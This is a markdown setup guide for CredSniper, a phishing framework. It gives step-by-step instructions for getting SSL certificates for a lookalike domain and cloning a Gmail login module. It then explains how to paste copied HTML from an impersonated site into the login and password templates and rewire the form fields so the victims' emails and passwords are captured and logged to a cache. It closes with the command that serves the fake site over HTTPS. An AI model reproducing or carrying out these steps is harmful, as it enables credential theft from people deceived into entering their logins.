# CredSniper : new phishing site setup 

## Generate new SSL certs
### Window 1:
- cd CredSniper
- python -m SimpleHTTPServer 80
- ctrl-c

### Window 2:
- (run)
- sudo certbot -d mailcloud.live --manual --preferred-challenges http certonly
- Yes
- (wait and jump to windows 3)
- Enter to continue
- (done here. go to windows 1)

### Window 3:
- cd CredSniper
- touch .well-known/acme-challenge/{random-string}
- edit file with auth code. 
- (done here. go to windows 2)

### Move new certs to 
- mv /etc/letsencrypt/archive/{domain}.tld/privkey1.pem certs/{domain}.tld.privkey.pem
- mv  /etc/letsencrypt/archive/{domain}.tld/fullchain1.pem certs/{domain}.tld.cert.pem


## Template Building

### basics
- Create a new module for the client or website type. 
- Copy gmail with cp -R gmail {name}
- Rename gmail.py to {name}.py
- Change the set_name to the {name} in {name}.py

### CredSniper/modules/{name}/ 
- {name}.py
This file contains the steps that the website will take based on actions on the website.
It will also load the main template files. 

### CredSniper/modules/{name}/templates/
Main important files for basic usage. 
- login.html
- password.html

#### Login
The login file will be the initial splash page. 
Wipe the template file, paste your html code in the file from the site you want to impersonate.

Look for the main <form> you will need to replace the action with  action="{{ next_url }}". On submission will take you to the next page specified in the main {name}.py file. 

You will also need to change the name of the input for the email field to email so that the email is passed off correctly. 

#### Password
Where the user logs in. 
Wipe the template file, paste your html code in the file from the site you want to impersonate.

Look for the main <form> you will need to replace the action with  action="{{ next_url }}". On submission will take you to the next page specified in the main {name}.py file. 

In order to populate the email field with the email, add the following {{ email }} to the value of the input field. 

Ensure that the password field name is password so that the password is passed off correctly. 



### How the files work

#### .cache
holds the logged creds that are entered on the website. 


## Run the site 
- CredSniper$ source bin/activate
- (CredSniper) ~/CredSniper$ redsniper.py --module {NAME} --port 443 --ssl --verbose --final {REDIRECT TO} --hostname {DOMAIN}
